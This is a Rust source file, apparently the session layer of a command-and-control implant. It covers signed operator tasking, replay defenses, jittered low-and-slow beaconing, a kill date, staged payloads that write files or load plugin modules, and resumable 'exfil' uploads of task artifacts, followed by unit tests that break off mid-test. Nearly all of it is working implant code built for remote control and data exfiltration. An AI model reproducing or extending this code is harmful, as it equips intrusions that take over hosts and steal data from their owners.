use prost::Message;
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;

use crate::channel::{self, Channels};
use crate::envelope;
use crate::handlers::{self, ArtifactRun, Cadence, Outcome};
use crate::outbox::Outbox;
use crate::plugins::Plugins;
use crate::trust::Certificate;
use crate::verify::{self, NonceTracker, Verdict};
use crate::wire::{
    ChannelOutput, ExfilChunk, Frame, FrameKind, HandshakeRequest, HandshakeResponse,
    ProtocolVersion, StagedChunk, StagedPull, TaskRequest,
};

/// One staged task's transfer state (ADR-010): the tasking, the bytes an
/// interrupted run already placed, and the running SHA-256 over exactly those
/// bytes -- the prefix proof the next demand carries. Lives on the session,
/// so it survives carriage switches, reconnects, and failed attempts: the
/// whole of the resume arm's client-side state.
struct StagedPending {
    task: TaskRequest,
    held: Vec<u8>,
    hasher: Sha256,
    /// Bytes held when the last cycle closed: the no-progress guard's
    /// reference point.
    last_len: usize,
    idle_cycles: u32,
}

/// Cycles a staged transfer may make no progress before its task fails: an
/// honest interruption resumes, a carrier that never serves the demand
/// surfaces on the task instead of parking it forever.
const STAGED_IDLE_CYCLES: u32 = 3;

/// One exfil upload run (ADR-010's upload arm): the artifact bytes a task
/// produced, held on the session until the server reports the run landed --
/// `StagedPending`'s upload mirror, so the run survives carriage switches,
/// reconnects, and failed contacts. The carriages slice it per contact under
/// the body budget; the seam reports move `confirmed` (ahead or back), and a
/// report at the run's end retires it.
struct ExfilRun {
    task: String,
    name: String,
    content_type: String,
    data: Vec<u8>,
    /// The SHA-256 of the whole run: the declared hash every slice carries.
    sha: Vec<u8>,
    /// Bytes the server's last report held: the seam every contact serves
    /// from. Optimistic sends never move it -- only a report does, so a
    /// contact that dies mid-flight re-sends from the last confirmed seam.
    confirmed: usize,
    last_confirmed: usize,
    idle_cycles: u32,
}

/// Cycles an upload run may make no progress before the session drops it:
/// the task's result already crossed, so the honest end of a run the server
/// never reports on is losing the artifact, not parking its bytes forever.
const EXFIL_IDLE_CYCLES: u32 = 3;

/// The frame carriages' slice size: the same 512 KiB budget the chunker
/// always ran, under the frame-layer sizing rule.
const EXFIL_CHUNK_BYTES: usize = 512 * 1024;

/// The pending-run snapshot the DNS carriage's drive walks.
pub struct ExfilStreamView {
    pub task: String,
    pub name: String,
    pub total: usize,
}

/// The exfil byte budget one contact carries: the envelope's body cap is
/// 16 MiB of wire bytes (base64-expanded when sealed), so the run's slices
/// leave room for the handshake, results, and demands beside them. A run
/// larger than this spans contacts -- that spanning is the arm's point.
pub const EXFIL_CONTACT_BUDGET: usize = 8 * 1024 * 1024;

/// Everything a contact carriage needs to serve one run: identity, the
/// advertisement, the live cadence, the seal, the signer pool, and the
/// cross-carriage task state (nonce floor, ledger, batch, staged transfers).
/// Carriages borrow the session; the session owns nothing transport-shaped.
/// The nonce floor deliberately spans carriages and reconnects -- the
/// server's counter is per-implant, so a replay through any door falls at the
/// same floor.
pub struct Session {
    pub implant_id: String,
    advertised: Vec<String>,
    pub cadence: Cadence,
    pub plugins: Plugins,
    pub seal: Option<Seal>,
    signer_pool: Vec<Certificate>,
    pub kill_date: Option<String>,
    pub nonces: NonceTracker,
    pub outbox: Outbox,
    pub channels: Channels,
    staged: BTreeMap<String, StagedPending>,
    exfil: Vec<ExfilRun>,
    contact_counter: u64,
}

/// The per-artifact contact seal split into its wire halves.
pub struct Seal {
    pub key_id: [u8; 16],
    pub key: [u8; 32],
}

impl Seal {
    pub fn parse(baked: &str) -> Option<Seal> {
        let (key_id, key) = envelope::parse_baked_key(baked)?;
        Some(Seal { key_id, key })
    }

    pub fn seal(&self, plaintext: &[u8], aad: &str) -> Vec<u8> {
        envelope::seal_contact_body(plaintext, &self.key_id, &self.key, aad)
    }

    pub fn open(&self, body: &[u8], aad: &str) -> Option<Vec<u8>> {
        envelope::try_open_contact_body(body, &self.key_id, &self.key, aad)
    }
}

/// Lowercase hex of a 32-byte SHA-256 digest.
fn hex_sha256(digest: &[u8]) -> String {
    let mut text = String::with_capacity(64);
    for byte in digest {
        use std::fmt::Write as _;
        let _ = write!(text, "{byte:02x}");
    }
    text
}

/// What the run loop does after one contact attempt.
pub enum Attempt {
    /// The cycle crossed and its response was processed.
    Crossed,
    /// The server's answer is permanent for this artifact.
    Refused,
}

impl Session {
    pub fn new(
        implant_id: String,
        baked_verbs: &[String],
        cadence: Cadence,
        signer_pool: Vec<Certificate>,
        seal: Option<Seal>,
        kill_date: Option<String>,
        poll_carriage: bool,
    ) -> Session {
        // The advertisement is the baked class verbs intersected with this
        // build's compiled handlers: the server only dispatches what this
        // binary can run (architecture.md Sec 5.3). A compiled-in extension
        // registers its verbs beside the core set (ADR-022) -- the build unit
        // generated its table from the same request that baked the profile,
        // so a verb the bake carries and the table answers is this
        // artifact's own. A poll bake carrying a channel verb also opts into
        // the degraded channel discipline: the wire-contract capability that
        // parks operator input server-side and drains it onto this implant's
        // poll contacts. A stream bake must NOT opt in -- the input route
        // prefers the park whenever it sees the advertisement, and a
        // long-lived stream never drains one, so its input rides the live
        // sink instead.
        let mut advertised = baked_verbs
            .iter()
            .filter(|verb| {
                handlers::COMPILED_VERBS.contains(&verb.as_str())
                    || crate::extensions::EXTENSION_VERBS.contains(&verb.as_str())
            })
            .cloned()
            .collect::<Vec<_>>();
        // The loader ABI advertisement (ADR-020): the session states which
        // loading contracts this build hosts, beside the verbs --
        // the runtime gate checks the loader a plugin needs, not merely that
        // some loader exists. The floors without a loader advertise none.
        #[cfg(all(unix, not(target_os = "android"), not(target_os = "macos")))]
        advertised.push("plugin-loader/exec-v1".to_string());
        #[cfg(windows)]
        {
            advertised.push("plugin-loader/native-v1".to_string());
            advertised.push("plugin-loader/coff-v1".to_string());
        }

        if poll_carriage && advertised.iter().any(|verb| channel::is_channel_verb(verb)) {
            advertised.push("channels.poll".to_string());
        }
        Session {
            implant_id,
            advertised,
            cadence,
            plugins: Plugins::new(),
            seal,
            signer_pool,
            kill_date,
            nonces: NonceTracker::default(),
            outbox: Outbox::default(),
            channels: Channels::new(),
            staged: BTreeMap::new(),
            exfil: Vec::new(),
            contact_counter: 0,
        }
    }

    /// Extends the advertisement with a carriage-negotiation capability --
    /// the socket family's live-session switch -- before the first
    /// handshake. Idempotent.
    pub fn advertise(&mut self, capability: &str) {
        if !self.advertised.iter().any(|held| held == capability) {
            self.advertised.push(capability.to_string());
        }
    }

    /// Widens the advertisement with the verbs the loaded modules
    /// registered (architecture.md Sec 5.4): the module table's routes are
    /// runtime-compiled handlers, so they advertise the same way the baked
    /// set does and report at the next contact. Idempotent per verb.
    pub fn sync_module_advertisements(&mut self) {
        for verb in self.plugins.advertised_verbs() {
            self.advertise(&verb);
        }
    }

    pub fn kill_date_passed(&self) -> bool {
        self.kill_date
            .as_deref()
            .and_then(crate::profile::parse_iso_to_unix)
            .map(|kill| crate::profile::unix_now() > kill)
            .unwrap_or(false)
    }

    /// The jittered inter-cycle wait, widened by consecutive failures --
    /// the exponential reconnect backoff the low-and-slow posture calls
    /// for. The driver sleeps it; the machine hands the wait to whatever
    /// shell drives it.
    pub fn backoff_wait(&self, failures: u32) -> std::time::Duration {
        let (base, jitter) = *self.cadence.lock().expect("cadence");
        let widened = (base.max(1.0) * 2f64.powi(failures.min(5) as i32)).min(600.0);
        let slack = if jitter > 0.0 {
            rand::Rng::gen_range(&mut rand::thread_rng(), -jitter..=jitter)
        } else {
            0.0
        };
        std::time::Duration::from_secs_f64((widened + slack).max(0.1))
    }

    /// The handshake this run opens every contact with: identity, protocol
    /// version, both negotiation arms, and the fresh cadence (architecture.md
    /// Sec 10.3 -- one advertisement rides each contact).
    pub fn handshake_frame(&mut self) -> Frame {
        let (sleep, jitter) = *self.cadence.lock().expect("cadence");
        Frame {
            payload: HandshakeRequest {
                version: Some(ProtocolVersion { major: 1, minor: 0 }),
                implant_id: self.implant_id.clone(),
                capabilities: self.advertised.clone(),
                replay_nonces: Some(true),
                task_acks: Some(true),
                sleep_seconds: Some(sleep),
                jitter_seconds: Some(jitter),
            }
            .encode_to_vec(),
            kind: 0,
        }
    }

    /// Reads the handshake answer: negotiates the nonce arm and returns the
    /// ack arm plus the run decision.
    pub fn handshake_answered(&mut self, frame: &Frame) -> Result<(bool, Attempt), &'static str> {
        let answer = HandshakeResponse::decode(frame.payload.as_ref())
            .map_err(|_| "the handshake answer was malformed")?;
        if answer.status != crate::wire::HandshakeStatus::Ok as i32 {
            return Ok((false, Attempt::Refused));
        }
        self.nonces.negotiated = answer.replay_nonces.unwrap_or(false);
        Ok((answer.task_acks.unwrap_or(false), Attempt::Crossed))
    }

    /// Encodes frames as this run's outgoing body: the framed bytes behind a
    /// fresh big-endian counter, sealed under the bake's key when it carries
    /// one; the counter burns per attempt, not per delivery, so a
    /// retransmission never trips the server's replay floor.
    pub fn encode_outgoing(&mut self, frames: &[Frame]) -> (Vec<u8>, &'static str) {
        let encoded = crate::wire::encode(frames);
        match &self.seal {
            Some(seal) => {
                self.contact_counter += 1;
                let mut plaintext = Vec::with_capacity(8 + encoded.len());
                plaintext.extend_from_slice(&self.contact_counter.to_be_bytes());
                plaintext.extend_from_slice(&encoded);
                (
                    seal.seal(&plaintext, envelope::CONTACT_REQUEST_AAD),
                    "text/plain",
                )
            }
            None => (encoded, "application/octet-stream"),
        }
    }

    /// Decodes an incoming body: sealed under the response's own purpose tag
    /// when the run seals, else the plaintext frames. A body that does not
    /// verify is a dropped cycle -- nothing inside it is acted on.
    pub fn decode_incoming(&self, body: &[u8]) -> Option<Vec<Frame>> {
        let plaintext = match &self.seal {
            Some(seal) => seal.open(body, envelope::CONTACT_RESPONSE_AAD)?,
            None => body.to_vec(),
        };
        crate::wire::parse(&plaintext)
    }

    /// The acceptance every carriage runs for one dispatched task:
    /// verification first (the replay defense stays ahead of the ledger),
    /// then dedup from the cache, then dispatch. Results and exfil chunks
    /// queue into the batch; the delivery mark is the carriage's to set.
    ///
    /// A staged task registers its transfer instead of executing: the
    /// payload is demanded before the verb can run, and the demand is
    /// carriage-shaped (the poll batch's pull frames, the live connection's
    /// blocking exchange, the DNS token download). Registration sits behind
    /// the same verification as every other acceptance -- staged tasking
    /// verifies before anything executes, the Tier 1 posture.
    pub fn accept(&mut self, task: &TaskRequest, acks: bool) {
        if acks {
            self.outbox.acknowledge(&task.task_id);
        }
        let verdict = verify::verify(&self.implant_id, task, &self.signer_pool, &mut self.nonces);
        match verdict {
            Verdict::Accepted => {
                if self.outbox.holds(&task.task_id) {
                    // The dedup half: a redelivery is answered from the cache
                    // (or, while unfinished, merely re-acked) -- nothing
                    // re-executes, a completed staged task included.
                    if let Some((outcome, output)) = self.outbox.cached(&task.task_id) {
                        self.outbox.result(&task.task_id, outcome, &output);
                    }
                    return;
                }
                if task.staged_bytes.is_some() {
                    self.demand_staged(task.clone());
                    return;
                }
                if self.channels.holds(&task.task_id) {
                    // A live channel: already accepted above, and its result
                    // comes when the channel ends -- a redelivery re-acks and
                    // nothing re-spawns.
                    return;
                }
                if channel::is_channel_verb(&task.verb) {
                    // The streaming task shape: the TaskRequest opens a
                    // channel instead of a completion. Output streams as
                    // ChannelOutput frames, input arrives as ChannelInput
                    // frames the carriages route in, and the final result
                    // queues when the channel reports it finished.
                    self.channels
                        .spawn(&task.verb, &task.task_id, &task.arguments);
                    return;
                }
                // Dispatch runs exactly once: the result and its artifact
                // run both come off this one execution. A module.load that
                // succeeded widened the plugin table's routes, so the
                // advertisement syncs right behind it. The run registers on
                // the session (the upload arm's state) instead of queueing
                // frames -- the carriages slice it per contact and resume it
                // from the server's seam reports (ADR-010).
                let handler =
                    handlers::dispatch(&task.verb, &task.arguments, &self.cadence, &self.plugins);
                self.outbox
                    .result(&task.task_id, handler.outcome, &handler.output);
                if let Some(run) = handler.artifact {
                    self.register_exfil(&task.task_id, run);
                }
                self.sync_module_advertisements();
            }
            rejected => {
                let cause = match rejected {
                    Verdict::RejectedReplay => format!(
                        "task rejected: replayed tasking (nonce {:?} at or below the accepted floor); not executed",
                        task.task_nonce
                    ),
                    Verdict::RejectedNoNonce => {
                        "task rejected: no task nonce after the replay-nonce handshake; not executed".to_string()
                    }
                    _ => "task rejected: signature verification failed; not executed".to_string(),
                };
                self.outbox
                    .result(&task.task_id, crate::handlers::Outcome::Failed, &cause);
            }
        }
    }

    // --- The staged transfer state (ADR-010): registration, demands,
    // placement, and the terminal dispatch -- one implementation every
    // carriage shares, because the transfer outlives any one of them.

    /// Registers a verified staged task's transfer. Idempotent: a redelivered
    /// staged task re-demands from what is already held.
    fn demand_staged(&mut self, task: TaskRequest) {
        self.staged
            .entry(task.task_id.clone())
            .or_insert_with(|| StagedPending {
                task,
                held: Vec::new(),
                hasher: Sha256::new(),
                last_len: 0,
                idle_cycles: 0,
            });
    }

    /// Whether a staged transfer is pending for the task -- the live
    /// carriages' signal that a just-accepted staged task needs its inline
    /// pull exchange.
    pub fn staged_holds(&self, task_id: &str) -> bool {
        self.staged.contains_key(task_id)
    }

    /// The pending transfers' task ids in demand order -- the live carriages
    /// re-drive these after a reconnect, because an acked staged task never
    /// redelivers.
    pub fn staged_pending(&self) -> Vec<String> {
        self.staged.keys().cloned().collect()
    }

    /// One transfer's demand frame: a fresh transfer sends the plain shape, a
    /// resumed one names the bytes it holds and proves them by hash.
    pub(crate) fn staged_pull_frame(&self, task_id: &str) -> Option<Frame> {
        let pending = self.staged.get(task_id)?;
        let (offset, prefix_sha256) = if pending.held.is_empty() {
            (None, None)
        } else {
            let proof = pending.hasher.clone();
            (
                Some(pending.held.len() as u64),
                Some(proof.finalize().to_vec()),
            )
        };
        Some(Frame {
            payload: StagedPull {
                task_id: task_id.to_string(),
                offset,
                prefix_sha256,
            }
            .encode_to_vec(),
            kind: FrameKind::StagedPull as i32,
        })
    }

    /// The demand frames this poll cycle carries: one per pending transfer,
    /// each at its current seam. Regenerated every cycle -- a cycle that dies
    /// mid-run leaves the held bytes in place, so the next demand resumes
    /// instead of re-serving the payload whole.
    pub fn staged_demands(&self) -> Vec<Frame> {
        self.staged
            .keys()
            .filter_map(|id| self.staged_pull_frame(id))
            .collect()
    }

    /// One transfer's seam -- the DNS carriage's demand grammar carries the
    /// pair in its query name instead of a frame.
    pub fn staged_seam(&self, task_id: &str) -> (u64, Option<Vec<u8>>) {
        match self.staged.get(task_id) {
            Some(pending) if !pending.held.is_empty() => {
                let proof = pending.hasher.clone();
                (pending.held.len() as u64, Some(proof.finalize().to_vec()))
            }
            _ => (0, None),
        }
    }

    /// Places one chunk of a staged transfer. A chunk naming its absolute
    /// offset places there: offset 0 over a non-empty hold is the server's
    /// restart signal and resets the transfer, a chunk the hold already
    /// covers is a duplicate no-op, and a gap is left unplaced -- the next
    /// demand re-establishes the seam. A chunk without the field comes from
    /// a pre-resume server: sequence 0 over a non-empty hold restarts,
    /// anything else appends in arrival order. The terminal chunk dispatches
    /// the task against the held bytes and reports the payload's hash with
    /// the result -- the both-side arm's implant half.
    pub fn accept_staged_chunk(&mut self, chunk: &StagedChunk) {
        let Some(mut pending) = self.staged.remove(&chunk.task_id) else {
            return;
        };
        let data = chunk.data.as_ref();
        match chunk.offset {
            Some(offset) if offset as usize == pending.held.len() => {
                pending.hasher.update(data);
                pending.held.extend_from_slice(data);
            }
            Some(0) if !pending.held.is_empty() => {
                // The server restarted the transfer whole.
                pending.held.clear();
                pending.hasher = Sha256::new();
                pending.hasher.update(data);
                pending.held.extend_from_slice(data);
            }
            Some(offset) if offset as usize + data.len() <= pending.held.len() => {
                // An already-covered duplicate: placement is a no-op, the
                // terminal flag still resolves the transfer.
            }
            Some(_) => {
                // A gap the hold cannot place: keep the state, re-demand.
                self.staged.insert(chunk.task_id.clone(), pending);
                return;
            }
            None if chunk.sequence == 0 && !pending.held.is_empty() => {
                pending.held.clear();
                pending.hasher = Sha256::new();
                pending.hasher.update(data);
                pending.held.extend_from_slice(data);
            }
            None => {
                pending.hasher.update(data);
                pending.held.extend_from_slice(data);
            }
        }

        if !chunk.terminal {
            self.staged.insert(chunk.task_id.clone(), pending);
            return;
        }

        let finalized = pending.hasher.clone();
        let payload_sha = hex_sha256(&finalized.finalize());
        let (outcome, output) =
            self.dispatch_staged(&pending.task.verb, &pending.task.arguments, &pending.held);
        self.outbox
            .result_with_payload_sha(&chunk.task_id, outcome, &output, &payload_sha);
    }

    /// The cycle boundary every poll carriage runs after its response: a
    /// transfer that grew keeps its patience, one that made no progress
    /// counts an idle cycle, and one idle past the bound fails its task --
    /// the honest end of a demand the carrier never served.
    pub fn staged_cycle_end(&mut self) {
        let ids: Vec<String> = self.staged.keys().cloned().collect();
        for id in ids {
            let Some(mut pending) = self.staged.remove(&id) else {
                continue;
            };
            if pending.held.len() > pending.last_len {
                pending.last_len = pending.held.len();
                pending.idle_cycles = 0;
                self.staged.insert(id, pending);
            } else if pending.idle_cycles + 1 >= STAGED_IDLE_CYCLES {
                self.outbox.result(
                    &id,
                    Outcome::Failed,
                    "staged payload stream ended without a terminal chunk",
                );
            } else {
                pending.idle_cycles += 1;
                self.staged.insert(id, pending);
            }
        }
    }

    /// The staged dispatch arm: the payload arrived, the arguments carry the
    /// grammar. file.push lands bytes on disk; module.load hands them to the
    /// plugin loader (architecture.md Sec 5.4). Anything else fails with the
    /// grammar named.
    fn dispatch_staged(
        &mut self,
        verb: &str,
        arguments: &str,
        payload: &[u8],
    ) -> (Outcome, String) {
        let Some(space) = arguments.rfind(' ') else {
            return (
                Outcome::Failed,
                format!("{verb} staged expects '<...> sha256:<hex>'"),
            );
        };
        let head = arguments[..space].trim();
        let Some(expected) = arguments[space + 1..].trim().strip_prefix("sha256:") else {
            return (
                Outcome::Failed,
                format!("{verb} staged expects '<...> sha256:<hex>'"),
            );
        };
        let actual = hex_sha256(&Sha256::digest(payload));
        if !actual.eq_ignore_ascii_case(expected) {
            return (
                Outcome::Failed,
                format!(
                    "{verb} staged: payload hash mismatch: expected {expected}, received {actual}"
                ),
            );
        }
        if verb == "module.load" {
            let name = head.trim();
            if name.is_empty() {
                return (
                    Outcome::Failed,
                    "module.load staged expects '<name> sha256:<hex>'".into(),
                );
            }
            return match self.plugins.load(name, payload, expected) {
                Ok(report) => {
                    // The routes widened: the next contact advertises them.
                    self.sync_module_advertisements();
                    (Outcome::Succeeded, report)
                }
                Err(cause) => (Outcome::Failed, cause),
            };
        }
        if verb != "file.push" {
            return (
                Outcome::Failed,
                format!("{verb}: this build carries no staged handler for the verb"),
            );
        }
        let path = head;
        if let Some(parent) = std::path::Path::new(path).parent() {
            let _ = std::fs::create_dir_all(parent);
        }
        match std::fs::write(path, payload) {
            Ok(()) => (
                Outcome::Succeeded,
                format!("{path}: {} bytes written", payload.len()),
            ),
            Err(err) => (Outcome::Failed, format!("write {path}: {err}")),
        }
    }

    // --- The exfil upload state (ADR-010): registration, per-contact
    // slicing, and the seam reports -- the staged transfer state's upload
    // mirror, one implementation every carriage shares.

    /// Registers a completed handler's artifact run. Idempotent per task by
    /// dispatch's own single-run guarantee.
    fn register_exfil(&mut self, task: &str, run: ArtifactRun) {
        let sha = Sha256::digest(&run.data).to_vec();
        self.exfil.push(ExfilRun {
            task: task.to_string(),
            name: run.name,
            content_type: run.content_type,
            data: run.data,
            sha,
            confirmed: 0,
            last_confirmed: 0,
            idle_cycles: 0,
        });
    }

    /// The slice frames this contact carries: each pending run serves from
    /// its confirmed seam within the budget, every slice at its absolute
    /// offset with the run's declared hash. Regenerated every cycle -- a
    /// contact that dies mid-flight never moved the seam, so the next one
    /// re-sends exactly the unconfirmed slices (placement is idempotent
    /// server-side, so a duplicate is a no-op, not corruption).
    pub fn exfil_frames(&mut self, budget: usize) -> Vec<Frame> {
        let mut frames = Vec::new();
        let mut budget = budget;
        for run in &mut self.exfil {
            let mut at = run.confirmed;
            while at < run.data.len() && budget > 0 {
                let take = EXFIL_CHUNK_BYTES.min(run.data.len() - at).min(budget);
                let terminal = at + take == run.data.len();
                frames.push(Frame {
                    payload: ExfilChunk {
                        task_id: run.task.clone(),
                        name: run.name.clone(),
                        content_type: run.content_type.clone(),
                        sequence: (at / EXFIL_CHUNK_BYTES) as u64,
                        terminal,
                        offset: Some(at as u64),
                        payload_sha256: Some(run.sha.clone()),
                        data: run.data[at..at + take].to_vec(),
                    }
                    .encode_to_vec(),
                    kind: FrameKind::ExfilChunk as i32,
                });
                at += take;
                budget -= take;
            }
        }
        frames
    }

    /// Whether any upload run is still owed -- the live carriage's tick-arm
    /// signal, so a run keeps slicing while the connection parks.
    pub fn exfil_pending(&self) -> bool {
        !self.exfil.is_empty()
    }

    /// The pending runs as a read-only snapshot -- the DNS carriage's drive
    /// iterates them to probe each run's seam (its grammar has no frames,
    /// so it walks the runs by name instead of slicing by budget).
    pub fn exfil_streams(&self) -> Vec<ExfilStreamView> {
        self.exfil
            .iter()
            .map(|run| ExfilStreamView {
                task: run.task.clone(),
                name: run.name.clone(),
                total: run.data.len(),
            })
            .collect()
    }

    /// One datagram-sized blob for the named run: the next slice from its
    /// confirmed seam as a single encoded ExfilChunk frame (offset, declared
    /// hash, terminal on the run's tail) -- the DNS carriage seals the frame
    /// whole and uploads it as one u. stream. The seam moves only on the
    /// probe's report, never on this send.
    pub fn exfil_blob(&mut self, task: &str, name: &str, max_bytes: usize) -> Option<Vec<u8>> {
        let run = self
            .exfil
            .iter()
            .find(|r| r.task == task && r.name == name)?;
        if run.confirmed >= run.data.len() {
            return None;
        }
        let from = run.confirmed;
        let take = max_bytes.min(run.data.len() - from);
        let terminal = from + take == run.data.len();
        Some(
            ExfilChunk {
                task_id: run.task.clone(),
                name: run.name.clone(),
                content_type: run.content_type.clone(),
                sequence: 0,
                terminal,
                offset: Some(from as u64),
                payload_sha256: Some(run.sha.clone()),
                data: run.data[from..from + take].to_vec(),
            }
            .encode_to_vec(),
        )
    }

    /// One seam report (an ExfilProgress frame): the server's held count is
    /// authoritative in both directions -- ahead, the next contact serves
    /// from the new seam; behind (an evicted or restarted server), the run
    /// rewinds and re-serves from the named bytes. A report at or past the
    /// run's end retires it: the artifact landed.
    pub fn exfil_progress(&mut self, task: &str, name: &str, held: u64) {
        self.exfil.retain_mut(|run| {
            if run.task != task || run.name != name {
                return true;
            }
            if held as usize >= run.data.len() {
                return false;
            }
            run.confirmed = held as usize;
            true
        });
    }

    /// The cycle boundary's no-progress guard, the staged transfer's own
    /// shape: a run whose seam never moved counts an idle cycle, and one
    /// idle past the bound is dropped -- the artifact is lost, but the
    /// session does not carry it forever.
    pub fn exfil_cycle_end(&mut self) {
        self.exfil.retain_mut(|run| {
            if run.confirmed > run.last_confirmed {
                run.last_confirmed = run.confirmed;
                run.idle_cycles = 0;
                true
            } else if run.idle_cycles + 1 >= EXFIL_IDLE_CYCLES {
                false
            } else {
                run.idle_cycles += 1;
                true
            }
        });
    }

    /// Moves the channel layer's produce into the batch: output chunks queue
    /// as ChannelOutput frames (upstream under the same seal and counter as
    /// every other frame), and a finished channel reports its task like any
    /// one-shot dispatch. The carriages call this at their delivery edges --
    /// the poll cycle's boundaries, the stream's message ticks -- so no
    /// pump ever touches a carriage.
    pub fn drain_channels(&mut self) {
        while let Some(event) = self.channels.next_event() {
            match event {
                channel::Event::Output { task, data } => {
                    self.outbox.queue(Frame {
                        payload: ChannelOutput {
                            task_id: task,
                            data,
                        }
                        .encode_to_vec(),
                        kind: FrameKind::ChannelOutput as i32,
                    });
                }
                channel::Event::Finished {
                    task,
                    outcome,
                    output,
                } => {
                    self.outbox.result(&task, outcome, &output);
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::wire::{ExfilChunk, HandshakeRequest, HandshakeResponse, TaskResult};
    use rsa::pkcs8::EncodePublicKey;
    use rsa::signature::{RandomizedSigner, SignatureEncoding};

    fn cadence() -> Cadence {
        std::sync::Arc::new(std::sync::Mutex::new((30.0, 0.0)))
    }

    fn bare_session(seal: Option<Seal>) -> Session {
        Session::new("i-1".into(), &[], cadence(), Vec::new(), seal, None, true)
    }

    fn advertised_of(session: &mut Session) -> Vec<String> {
        HandshakeRequest::decode(session.handshake_frame().payload.as_ref())
            .expect("the handshake decodes")
            .capabilities
    }

    /// A session whose verifier pool holds one RSA key, plus a signed staged
    /// file.push task whose arguments' sha256 token names `payload` -- the
    /// fixture the transfer tests run.
    fn staged_session(payload: &[u8]) -> (Session, TaskRequest) {
        let sha = hex_sha256(&Sha256::digest(payload));
        let mut rng = rand::thread_rng();
        let private = rsa::RsaPrivateKey::new(&mut rng, 2048).expect("rsa keygen");
        let spki = private
            .to_public_key()
            .to_public_key_der()
            .expect("spki der");
        let signer = Certificate {
            spki: spki.as_bytes().to_vec(),
        };
        let mut session =
            Session::new("i-1".into(), &[], cadence(), vec![signer], None, None, true);
        let task = TaskRequest {
            task_id: "st-1".into(),
            verb: "file.push".into(),
            arguments: format!("/tmp/rod-staged-test sha256:{sha}"),
            staged_bytes: Some(payload.len() as u64),
            ..Default::default()
        };
        let canonical =
            verify::canonical_bytes("i-1", &task.task_id, &task.verb, &task.arguments, None);
        let signing = rsa::pss::SigningKey::<sha2::Sha256>::new(private);
        let mut rng = rand::thread_rng();
        let signed = TaskRequest {
            signature: signing.sign_with_rng(&mut rng, &canonical).to_vec(),
            ..task
        };
        session.accept(&signed, false);
        (session, signed)
    }

    fn chunk(task: &str, sequence: u64, offset: u64, terminal: bool, data: &[u8]) -> StagedChunk {
        StagedChunk {
            task_id: task.into(),
            sequence,
            terminal,
            data: data.to_vec(),
            offset: Some(offset),
        }
    }

    #[test]
    fn sealed_cycles_round_trip_and_burn_a_counter_per_attempt() {
        let mut session = bare_session(Some(Seal {
            key_id: [0x11; 16],
            key: [0x22; 32],
        }));
        let handshake = session.handshake_frame();
        let first = session.encode_outgoing(&[handshake]).0;
        let second = session.encode_outgoing(&[]).0;
        // The counter burns per attempt, not per delivery, so a
        // retransmission never trips the server's replay floor.
        assert_ne!(first, second);
        // The response side opens under its own purpose tag -- and refuses
        // the request tag's bytes.
        let inbound = crate::envelope::seal_contact_body(
            b"",
            &[0x11; 16],
            &[0x22; 32],
            crate::envelope::CONTACT_RESPONSE_AAD,
        );
        assert_eq!(
            session.decode_incoming(&inbound).map(|frames| frames.len()),
            Some(0)
        );
        assert_eq!(session.decode_incoming(&first), None);
    }

    #[test]
    fn unsealed_cycles_pass_frames_through() {
        let mut session = bare_session(None);
        let handshake = session.handshake_frame();
        let (body, content_type) = session.encode_outgoing(&[handshake]);
        assert_eq!(content_type, "application/octet-stream");
        assert_eq!(
            session.decode_incoming(&body).map(|frames| frames.len()),
            Some(1)
        );
    }

    #[test]
    fn handshake_answers_negotiate_or_refuse() {
        let mut session = bare_session(None);
        let answer = Frame {
            payload: HandshakeResponse {
                status: crate::wire::HandshakeStatus::Ok as i32,
                replay_nonces: Some(true),
                task_acks: Some(true),
                ..Default::default()
            }
            .encode_to_vec(),
            kind: 0,
        };
        let (acks, attempt) = session
            .handshake_answered(&answer)
            .expect("the answer reads");
        assert!(acks);
        assert!(matches!(attempt, Attempt::Crossed));
        assert!(session.nonces.negotiated);
        let refused = Frame {
            payload: HandshakeResponse {
                status: crate::wire::HandshakeStatus::ImplantRetired as i32,
                ..Default::default()
            }
            .encode_to_vec(),
            kind: 0,
        };
        let (_, attempt) = session
            .handshake_answered(&refused)
            .expect("the answer reads");
        assert!(matches!(attempt, Attempt::Refused));
        let garbage = Frame {
            payload: vec![0xff, 0xff, 0xff, 0xff],
            kind: 0,
        };
        assert!(session.handshake_answered(&garbage).is_err());
    }

    #[test]
    fn the_advertisement_intersects_the_compiled_handlers() {
        let baked = ["shell.exec".to_string(), "no.such.verb".to_string()];
        let mut session = Session::new("i".into(), &baked, cadence(), Vec::new(), None, None, true);
        // The baked verbs intersect the compiled set, and the loader ABI
        // this build hosts rides beside them (ADR-020): the runtime gate
        // checks the loader a plugin needs, not merely that one exists.
        #[cfg(all(unix, not(target_os = "android"), not(target_os = "macos")))]
        assert_eq!(
            advertised_of(&mut session),
            vec![
                "shell.exec".to_string(),
                "plugin-loader/exec-v1".to_string()
            ]
        );
        #[cfg(windows)]
        assert_eq!(
            advertised_of(&mut session),
            vec![
                "shell.exec".to_string(),
                "plugin-loader/native-v1".to_string(),
                "plugin-loader/coff-v1".to_string()
            ]
        );
        #[cfg(any(target_os = "android", target_os = "macos"))]
        assert_eq!(advertised_of(&mut session), vec!["shell.exec".to_string()]);
    }

    #[test]
    fn poll_bakes_opt_into_the_degraded_channel_walk() {
        let baked = ["tunnel.socks".to_string(), "shell.exec".to_string()];
        let mut poll = Session::new("i".into(), &baked, cadence(), Vec::new(), None, None, true);
        assert!(advertised_of(&mut poll).contains(&"channels.poll".to_string()));
        // A stream bake must not: the park would never drain.
        let mut stream = Session::new("i".into(), &baked, cadence(), Vec::new(), None, None, false);
        assert!(!advertised_of(&mut stream).contains(&"channels.poll".to_string()));
    }

    #[test]
    fn carriage_advertisements_are_idempotent() {
        let mut session = bare_session(None);
        session.advertise("cap.x");
        session.advertise("cap.x");
        let advertised = advertised_of(&mut session);
        assert_eq!(advertised.iter().filter(|cap| *cap == "cap.x").count(), 1);
    }

    #[test]
    fn module_verbs_join_the_advertisement_at_load() {
        // The widening rule (architecture.md Sec 5.4): a loaded module's
        // routes are runtime-compiled handlers, so they advertise like the
        // baked set and report at the next contact. The sync is idempotent
        // and drops nothing already advertised.
        let mut session = Session::new(
            "i".into(),
            &["shell.exec".to_string()],
            cadence(),
            Vec::new(),
            None,
            None,
            true,
        );
        session
            .plugins
            .install(crate::plugins::ModuleEntry::new_for_test(
                "sweep",
                &["recon.sweep"],
            ));
        session.sync_module_advertisements();
        let advertised = advertised_of(&mut session);
        assert!(advertised.contains(&"shell.exec".to_string()));
        assert!(advertised.contains(&"recon.sweep".to_string()));
